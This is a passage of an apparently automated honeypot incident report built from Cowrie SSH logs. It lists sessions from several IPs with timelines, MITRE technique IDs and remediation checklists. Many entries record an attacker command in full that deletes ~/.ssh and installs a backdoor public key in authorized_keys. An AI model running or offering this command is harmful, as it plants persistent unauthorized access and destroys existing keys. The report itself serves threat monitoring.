| `2026-06-07 12:00:58` | `cowrie.log.closed` |
| `2026-06-07 12:00:58` | `cowrie.session.params` |
| `2026-06-07 12:00:58` | `cowrie.command.input` |
| `2026-06-07 12:00:58` | `cowrie.log.closed` |
| `2026-06-07 12:00:58` | `cowrie.session.params` |
| `2026-06-07 12:00:58` | `cowrie.command.input` |
| `2026-06-07 12:00:58` | `cowrie.session.file_download` |
| `2026-06-07 12:00:58` | `cowrie.log.closed` |
| `2026-06-07 12:00:59` | `cowrie.session.params` |
| `2026-06-07 12:00:59` | `cowrie.command.input` |
| `2026-06-07 12:00:59` | `cowrie.log.closed` |
| `2026-06-07 12:01:00` | `cowrie.session.params` |
| `2026-06-07 12:01:00` | `cowrie.command.input` |
| `2026-06-07 12:01:00` | `cowrie.log.closed` |
| `2026-06-07 12:01:00` | `cowrie.session.params` |
| `2026-06-07 12:01:00` | `cowrie.command.input` |
| `2026-06-07 12:01:00` | `cowrie.command.input` |
| `2026-06-07 12:01:01` | `cowrie.log.closed` |
| `2026-06-07 12:01:01` | `cowrie.session.params` |
| `2026-06-07 12:01:01` | `cowrie.command.input` |
| `2026-06-07 12:01:01` | `cowrie.log.closed` |
| `2026-06-07 12:01:01` | `cowrie.session.params` |
| `2026-06-07 12:01:01` | `cowrie.command.input` |
| `2026-06-07 12:01:01` | `cowrie.log.closed` |
| `2026-06-07 12:01:02` | `cowrie.session.params` |
| `2026-06-07 12:01:02` | `cowrie.command.input` |
| `2026-06-07 12:01:02` | `cowrie.log.closed` |
| `2026-06-07 12:01:02` | `cowrie.session.params` |
| `2026-06-07 12:01:02` | `cowrie.command.input` |
| `2026-06-07 12:01:02` | `cowrie.log.closed` |
| `2026-06-07 12:01:03` | `cowrie.session.params` |
| `2026-06-07 12:01:03` | `cowrie.command.input` |
| `2026-06-07 12:01:03` | `cowrie.log.closed` |
| `2026-06-07 12:01:03` | `cowrie.session.params` |
| `2026-06-07 12:01:03` | `cowrie.command.input` |
| `2026-06-07 12:01:03` | `cowrie.log.closed` |
| `2026-06-07 12:01:04` | `cowrie.session.params` |
| `2026-06-07 12:01:04` | `cowrie.command.input` |
| `2026-06-07 12:01:04` | `cowrie.log.closed` |
| `2026-06-07 12:01:05` | `cowrie.session.params` |
| `2026-06-07 12:01:05` | `cowrie.command.input` |
| `2026-06-07 12:01:06` | `cowrie.log.closed` |
| `2026-06-07 12:01:06` | `cowrie.session.params` |
| `2026-06-07 12:01:06` | `cowrie.command.input` |
| `2026-06-07 12:01:06` | `cowrie.log.closed` |
| `2026-06-07 12:01:06` | `cowrie.session.params` |
| `2026-06-07 12:01:06` | `cowrie.command.input` |
| `2026-06-07 12:01:07` | `cowrie.log.closed` |
| `2026-06-07 12:01:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]231` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-101970a5fd46

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:03 |
| **Last Seen** | 2026-06-07 12:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:03:25` | `cowrie.session.connect` |
| `2026-06-07 12:03:25` | `cowrie.client.version` |
| `2026-06-07 12:03:25` | `cowrie.client.kex` |
| `2026-06-07 12:03:25` | `cowrie.login.success` |
| `2026-06-07 12:03:26` | `cowrie.session.params` |
| `2026-06-07 12:03:26` | `cowrie.command.input` |
| `2026-06-07 12:03:26` | `cowrie.command.failed` |
| `2026-06-07 12:03:26` | `cowrie.log.closed` |
| `2026-06-07 12:03:26` | `cowrie.session.params` |
| `2026-06-07 12:03:26` | `cowrie.command.input` |
| `2026-06-07 12:03:26` | `cowrie.session.file_download` |
| `2026-06-07 12:03:26` | `cowrie.log.closed` |
| `2026-06-07 12:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a64f6fb17270

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:03 |
| **Last Seen** | 2026-06-07 12:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:03:26` | `cowrie.session.connect` |
| `2026-06-07 12:03:26` | `cowrie.client.version` |
| `2026-06-07 12:03:26` | `cowrie.client.kex` |
| `2026-06-07 12:03:30` | `cowrie.login.success` |
| `2026-06-07 12:03:31` | `cowrie.session.params` |
| `2026-06-07 12:03:31` | `cowrie.command.input` |
| `2026-06-07 12:03:31` | `cowrie.command.failed` |
| `2026-06-07 12:03:31` | `cowrie.log.closed` |
| `2026-06-07 12:03:32` | `cowrie.session.params` |
| `2026-06-07 12:03:32` | `cowrie.command.input` |
| `2026-06-07 12:03:32` | `cowrie.session.file_download` |
| `2026-06-07 12:03:32` | `cowrie.log.closed` |
| `2026-06-07 12:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c042e4274d6b

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:03 |
| **Last Seen** | 2026-06-07 12:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:03:27` | `cowrie.session.connect` |
| `2026-06-07 12:03:27` | `cowrie.client.version` |
| `2026-06-07 12:03:27` | `cowrie.client.kex` |
| `2026-06-07 12:03:28` | `cowrie.login.success` |
| `2026-06-07 12:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d1adc550d96

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:03 |
| **Last Seen** | 2026-06-07 12:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:03:35` | `cowrie.session.connect` |
| `2026-06-07 12:03:35` | `cowrie.client.version` |
| `2026-06-07 12:03:35` | `cowrie.client.kex` |
| `2026-06-07 12:03:36` | `cowrie.login.success` |
| `2026-06-07 12:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-772531c561cb

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:06 |
| **Last Seen** | 2026-06-07 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:06:07` | `cowrie.session.connect` |
| `2026-06-07 12:06:07` | `cowrie.client.version` |
| `2026-06-07 12:06:07` | `cowrie.client.kex` |
| `2026-06-07 12:06:07` | `cowrie.login.success` |
| `2026-06-07 12:06:07` | `cowrie.session.params` |
| `2026-06-07 12:06:07` | `cowrie.command.input` |
| `2026-06-07 12:06:07` | `cowrie.command.failed` |
| `2026-06-07 12:06:07` | `cowrie.log.closed` |
| `2026-06-07 12:06:07` | `cowrie.session.params` |
| `2026-06-07 12:06:07` | `cowrie.command.input` |
| `2026-06-07 12:06:07` | `cowrie.session.file_download` |
| `2026-06-07 12:06:07` | `cowrie.log.closed` |
| `2026-06-07 12:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecc339d27b17

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:06 |
| **Last Seen** | 2026-06-07 12:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:06:08` | `cowrie.session.connect` |
| `2026-06-07 12:06:08` | `cowrie.client.version` |
| `2026-06-07 12:06:08` | `cowrie.client.kex` |
| `2026-06-07 12:06:09` | `cowrie.login.success` |
| `2026-06-07 12:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-804820dc4fb3

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:07 |
| **Last Seen** | 2026-06-07 12:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:07:33` | `cowrie.session.connect` |
| `2026-06-07 12:07:33` | `cowrie.client.version` |
| `2026-06-07 12:07:34` | `cowrie.client.kex` |
| `2026-06-07 12:07:35` | `cowrie.login.success` |
| `2026-06-07 12:07:36` | `cowrie.session.params` |
| `2026-06-07 12:07:36` | `cowrie.command.input` |
| `2026-06-07 12:07:36` | `cowrie.command.failed` |
| `2026-06-07 12:07:37` | `cowrie.log.closed` |
| `2026-06-07 12:07:37` | `cowrie.session.params` |
| `2026-06-07 12:07:37` | `cowrie.command.input` |
| `2026-06-07 12:07:38` | `cowrie.session.file_download` |
| `2026-06-07 12:07:38` | `cowrie.log.closed` |
| `2026-06-07 12:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abcdcec42c7b

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:07 |
| **Last Seen** | 2026-06-07 12:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:07:41` | `cowrie.session.connect` |
| `2026-06-07 12:07:41` | `cowrie.client.version` |
| `2026-06-07 12:07:42` | `cowrie.client.kex` |
| `2026-06-07 12:07:43` | `cowrie.login.success` |
| `2026-06-07 12:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f06da4ce21b

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:08 |
| **Last Seen** | 2026-06-07 12:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:08:19` | `cowrie.session.connect` |
| `2026-06-07 12:08:19` | `cowrie.client.version` |
| `2026-06-07 12:08:19` | `cowrie.client.kex` |
| `2026-06-07 12:08:19` | `cowrie.login.success` |
| `2026-06-07 12:08:19` | `cowrie.session.params` |
| `2026-06-07 12:08:19` | `cowrie.command.input` |
| `2026-06-07 12:08:19` | `cowrie.command.failed` |
| `2026-06-07 12:08:19` | `cowrie.log.closed` |
| `2026-06-07 12:08:19` | `cowrie.session.params` |
| `2026-06-07 12:08:19` | `cowrie.command.input` |
| `2026-06-07 12:08:19` | `cowrie.session.file_download` |
| `2026-06-07 12:08:19` | `cowrie.log.closed` |
| `2026-06-07 12:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c890e528840

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:08 |
| **Last Seen** | 2026-06-07 12:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:08:20` | `cowrie.session.connect` |
| `2026-06-07 12:08:20` | `cowrie.client.version` |
| `2026-06-07 12:08:20` | `cowrie.client.kex` |
| `2026-06-07 12:08:20` | `cowrie.login.success` |
| `2026-06-07 12:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b13b04e1ac5f

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:09 |
| **Last Seen** | 2026-06-07 12:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:09:03` | `cowrie.session.connect` |
| `2026-06-07 12:09:03` | `cowrie.client.version` |
| `2026-06-07 12:09:03` | `cowrie.client.kex` |
| `2026-06-07 12:09:03` | `cowrie.login.success` |
| `2026-06-07 12:09:03` | `cowrie.session.params` |
| `2026-06-07 12:09:03` | `cowrie.command.input` |
| `2026-06-07 12:09:03` | `cowrie.command.failed` |
| `2026-06-07 12:09:03` | `cowrie.log.closed` |
| `2026-06-07 12:09:04` | `cowrie.session.params` |
| `2026-06-07 12:09:04` | `cowrie.command.input` |
| `2026-06-07 12:09:04` | `cowrie.session.file_download` |
| `2026-06-07 12:09:04` | `cowrie.log.closed` |
| `2026-06-07 12:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-834bde6768ad

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:09 |
| **Last Seen** | 2026-06-07 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:09:05` | `cowrie.session.connect` |
| `2026-06-07 12:09:05` | `cowrie.client.version` |
| `2026-06-07 12:09:05` | `cowrie.client.kex` |
| `2026-06-07 12:09:05` | `cowrie.login.success` |
| `2026-06-07 12:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a79a980cf0b0

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:09 |
| **Last Seen** | 2026-06-07 12:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:09:39` | `cowrie.session.connect` |
| `2026-06-07 12:09:39` | `cowrie.client.version` |
| `2026-06-07 12:09:39` | `cowrie.client.kex` |
| `2026-06-07 12:09:41` | `cowrie.login.success` |
| `2026-06-07 12:09:42` | `cowrie.session.params` |
| `2026-06-07 12:09:42` | `cowrie.command.input` |
| `2026-06-07 12:09:42` | `cowrie.command.failed` |
| `2026-06-07 12:09:42` | `cowrie.log.closed` |
| `2026-06-07 12:09:43` | `cowrie.session.params` |
| `2026-06-07 12:09:43` | `cowrie.command.input` |
| `2026-06-07 12:09:43` | `cowrie.session.file_download` |
| `2026-06-07 12:09:43` | `cowrie.log.closed` |
| `2026-06-07 12:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e2bf1e9b6de

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:09 |
| **Last Seen** | 2026-06-07 12:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:09:46` | `cowrie.session.connect` |
| `2026-06-07 12:09:46` | `cowrie.client.version` |
| `2026-06-07 12:09:47` | `cowrie.client.kex` |
| `2026-06-07 12:09:48` | `cowrie.login.success` |
| `2026-06-07 12:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-514bad3de1e1

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:10 |
| **Last Seen** | 2026-06-07 12:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:10:23` | `cowrie.session.connect` |
| `2026-06-07 12:10:23` | `cowrie.client.version` |
| `2026-06-07 12:10:23` | `cowrie.client.kex` |
| `2026-06-07 12:10:23` | `cowrie.login.success` |
| `2026-06-07 12:10:23` | `cowrie.session.params` |
| `2026-06-07 12:10:23` | `cowrie.command.input` |
| `2026-06-07 12:10:23` | `cowrie.command.failed` |
| `2026-06-07 12:10:23` | `cowrie.log.closed` |
| `2026-06-07 12:10:23` | `cowrie.session.params` |
